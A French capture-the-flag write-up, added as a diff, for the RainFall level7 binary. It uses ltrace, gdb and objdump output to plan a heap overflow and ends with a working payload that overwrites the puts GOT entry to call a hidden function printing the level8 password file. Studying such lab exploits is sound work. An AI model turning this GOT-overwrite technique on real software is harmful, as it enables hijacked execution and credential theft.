@@ -1,0 +1,95 @@
+on peut overflow la destination du deuxième strcpy avec le premier argument :
+
+level7@RainFall:~$ ltrace ./level7 $(python -c 'print "A" * 24') BBBB
+__libc_start_main(0x8048521, 2, 0xbffff7a4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                                = 0x0804a008
+malloc(8)                                                                = 0x0804a018
+malloc(8)                                                                = 0x0804a028
+malloc(8)                                                                = 0x0804a038
+strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAAA")                           = 0x0804a018
+strcpy(0x41414141, "BBBB" <unfinished ...>
+
+le deuxième argument reste inchangé, on pourrait donc rediriger une adresse avec le deuxième input sur une autre adresse donné par notre buffer overflow du premier argument
+
+avec objdump -t level7 on peut observer :
+m une fonction cachée qui n'est pas appelée par le main (gdb level7 puis disas main)
+c une variable globale qui a une taille de 80 (50 en hexa)
+
+080484f4 g     F .text	0000002d              m
+08049960 g     O .bss	00000050              c
+
+analysons le comportement de m : 
+
+(gdb) set disassembly-f i
+(gdb) disas m
+Dump of assembler code for function m:
+   0x080484f4 <+0>:	push   ebp
+   0x080484f5 <+1>:	mov    ebp,esp
+   0x080484f7 <+3>:	sub    esp,0x18
+   0x080484fa <+6>:	mov    DWORD PTR [esp],0x0
+   0x08048501 <+13>:	call   0x80483d0 <time@plt>
+   0x08048506 <+18>:	mov    edx,0x80486e0
+   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
+   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
+   0x08048517 <+35>:	mov    DWORD PTR [esp],edx
+   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
+   0x0804851f <+43>:	leave
+   0x08048520 <+44>:	ret
+End of assembler dump.
+
+on a un printf avec 3 arguments: 
+en ordre inverse :
+le retour le la fonction time contenu dans le registre eax
+la variable globale c
+et ce qui est contenu dans edx: assignée à la ligne m<+18>:
+
+(gdb) x/s 0x80486e0
+0x80486e0:	 "%s - %d\n"
+
+il semblerait qu'on puisse afficher le contenu de c grâce à la fonction m si on arrive à l'appeler
+
+regardons le main : 
+il y a un fopen suivi d'un fgets
+le fopen prends deux arguments, visible grâce à un ltrace ou dans gdb :
+(gdb) x/s 0x80486e9
+0x80486e9:	 "r"
+(gdb) x/s 0x80486eb
+0x80486eb:	 "/home/user/level8/.pass"
+
+fgets prends ensuite 3 arguments :
+dans l'ordre : 
+0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960 => notre variable globale c, elle va récupérer le contenu du fichier
+0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44 => une taille maximale, en dur : 68 (ça devrait suffir pour le contenu du fichier .pass)
+0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax => le fd récupérer grâce à fopen
+
+il faudrait donc trouver comment lire notre variable c après le fgets
+
+la fonction m permet de lire c
+
+il y a encore un appel à fonction après le fgets, le puts qui nous nargue avec '~~'
+
+level7@RainFall:~$ objdump -R level7
+
+level7:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049904 R_386_GLOB_DAT    __gmon_start__
+08049914 R_386_JUMP_SLOT   printf
+08049918 R_386_JUMP_SLOT   fgets
+0804991c R_386_JUMP_SLOT   time
+08049920 R_386_JUMP_SLOT   strcpy
+08049924 R_386_JUMP_SLOT   malloc
+08049928 R_386_JUMP_SLOT   puts
+0804992c R_386_JUMP_SLOT   __gmon_start__
+08049930 R_386_JUMP_SLOT   __libc_start_main
+08049934 R_386_JUMP_SLOT   fopen
+
+grâce à objdump -R on récupère l'adresse du puts
+
+et à cette adresse (\x28\x99\x04\x08) on va écrire l'adresse de notre fonction m (\xf4\x84\x04\x08) grâce au deuxième strcpy
+
+
+ce qui nous donne une payload :
+
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
